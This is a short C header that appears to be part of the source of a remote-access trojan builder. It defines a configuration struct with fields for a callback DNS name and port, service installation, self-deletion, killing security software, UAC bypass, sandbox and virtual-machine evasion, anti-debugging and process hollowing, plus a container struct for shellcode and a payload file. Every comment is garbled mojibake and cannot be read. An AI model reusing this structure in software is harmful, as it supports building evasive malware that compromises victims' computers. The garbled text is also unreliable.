#pragma once
struct  MODIFY_DATA// ����Dat�ļ��ṹ
{
	char DNS[256];  //����
	int  Port;		//�˿�
	char UpGroup[32];					//���߷���
	char Packet[32];						//��ע
	char szCurrentDateTime[32];	//��װʱ��
	char ServiceName[50];			//��������
	char ServicePlay[50];				//������ʾ
	char ServiceDesc[150];			//��������
	char ReleasePath[100];			//��װ·��
	char ReleaseName[50];			//��װ����
	char szthisfile[MAX_PATH];    //��ǰ�����ļ�
	int  Dele_zc;							//��������
	BYTE ismove;							//�Ƿ���Ҫ�ƶ��ļ�
	BYTE dllorexe;							//�����ɵ�dll ����exe
	BYTE selfDel;							//��ɾ��
	BYTE kill;								//��ɱ
	BYTE Uac;								//�ƹ�uac
	BYTE weibu;								//�ƹ�΢��ɳ��
	BYTE vm;								//�������
	BYTE antidebug;							//������
	BYTE puppet;							//�Ƿ����ÿ��ܽ���
	char Reserve[11];
};

typedef struct
{
	TCHAR Shellcode[10 * 1024];
	int  dwShellcodelen;
	TCHAR File[300 * 1024];
	int  dwFilelen;
	MODIFY_DATA modify_data;
	int RunSessionid;
}ShellcodeStr;

